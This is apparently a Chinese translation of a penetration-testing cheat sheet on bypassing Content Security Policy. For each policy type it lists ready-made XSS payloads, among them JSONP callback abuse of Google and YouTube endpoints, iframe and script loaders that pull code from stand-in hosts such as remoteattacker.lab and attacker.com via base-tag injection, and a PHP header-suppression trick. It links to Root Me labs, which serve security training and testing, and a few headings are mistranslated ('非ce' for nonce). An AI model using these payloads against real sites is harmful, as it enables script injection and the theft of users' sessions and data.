# 内容安全策略绕过

> 内容安全策略（CSP）是一种安全功能，旨在防止网页应用程序遭受跨站脚本攻击（XSS）、数据注入攻击以及其他代码注入漏洞。它通过指定哪些内容来源（如脚本、样式、图片等）可以在网页上加载和执行来实现这一目标。

## 概述

- [CSP检测](#csp-detection)
- [利用JSONP绕过CSP](#利用jsonp绕过csp)
- [绕过CSP default-src](#绕过csp-default-src)
- [绕过CSP内联eval](#绕过csp-内联eval)
- [绕过CSP unsafe-inline](#绕过csp-unsafe-inline)
- [绕过CSP script-src self](#绕过csp-script-src-self)
- [绕过CSP script-src data](#绕过csp-script-src-data)
- [绕过CSP nonce](#绕过csp-nonce)
- [绕过由PHP发送的CSP头](#绕过由php发送的csp头)
- [实验](#实验)
- [参考文献](#参考文献)

## CSP检测

在[https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)和文章[如何使用Google的CSP评估器绕过CSP](https://websecblog.com/vulns/google-csp-evaluator/)中检查CSP。

## 利用JSONP绕过CSP

**需求**：

- CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`

**载荷**：

使用CSP中列出的白名单来源的回调函数。

- Google搜索: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
- Google账户: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
- Google翻译: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
- YouTube: `https://www.youtube.com/oembed?callback=alert;`
- [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
- [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)

```js
<script src="//google.com/complete/search?client=chrome%26jsonp=alert(1);"></script>
```

## 绕过CSP default-src

**需求**：

- CSP类似 `Content-Security-Policy: default-src 'self' 'unsafe-inline';`,

**载荷**：

```js
http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;
```

```js
script=document.createElement('script');
script.src='//remoteattacker.lab/csp.js';
window.frames[0].document.head.appendChild(script);
```

来源: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)

## 绕过CSP内联eval

**需求**：

- CSP `inline` 或 `eval`

**载荷**：

```js
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

来源: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)

## 绕过CSP script-src self

**需求**：

- CSP类似 `script-src self`

**载荷**：

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

来源: [@akita_zen](https://twitter.com/akita_zen)

## 绕过CSP script-src data

**需求**：

- CSP类似 `script-src 'self' data:` 如官方[Mozilla文档](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)中警告的那样。

**载荷**：

```javascript
<script src="data:,alert(1)">/</script>
```

来源: [@404death](https://twitter.com/404death/status/1191222237782659072)

## 绕过CSP unsafe-inline

**需求**：

- CSP: `script-src https://google.com 'unsafe-inline';`

**载荷**：

```javascript
"/><script>alert(1);</script>
```

## 绕过CSP nonce

**需求**：

- CSP类似 `script-src 'nonce-RANDOM_NONCE'`
- 带有相对链接的导入JS文件: `<script src='/PATH.js'></script>`

**载荷**：

- 注入一个base标签。

  ```html
  <base href=http://www.attacker.com>
  ```

- 在网站脚本所在路径托管自定义js文件。

  ```ps1
  http://www.attacker.com/PATH.js
  ```

## 绕过PHP发送的CSP头

**需求**：

- PHP通过`header()`函数发送的CSP

**载荷**：

在默认的`php:apache`镜像配置中，当响应的数据已经写入时，PHP无法修改头部。这通常发生在PHP引擎触发警告时。

以下是几种生成警告的方法：

- 1000个$_GET参数
- 1000个$_POST参数
- 20个$_FILES

如果警告被配置为显示，你应该会看到这些：

- **警告**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`
- **警告**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`

```ps1
GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[重复添加&1000次&a]&a&a&a&a
```

来源: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)

## 实验

- [Root Me - CSP绕过 - 内联代码](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)
- [Root Me - CSP绕过 - 非ce](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)
- [Root Me - CSP绕过 - 非ce 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce-2)
- [Root Me - CSP绕过 - 悬挂标记](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup)
- [Root Me - CSP绕过 - 悬挂标记 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup-2)
- [Root Me - CSP绕过 - JSONP](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)

## 参考文献

- [Airbnb – 当绕过JSON编码、XSS过滤器、WAF、CSP和Auditor时变成了八个漏洞 - Brett Buerhaus (@bbuerhaus) - 2017年3月8日](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)
- [D1T1 - 我们打破了所有的CSP - Michele Spagnuolo和Lukas Weichselbaum - 2017年6月27日](http://web.archive.org/web/20170627043828/https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)
- [在Twitter上触发CSP绕过的XSS - wiki.ioin.in(原文链接) - 2020年4月6日](https://www.buaq.net/go-25883.html)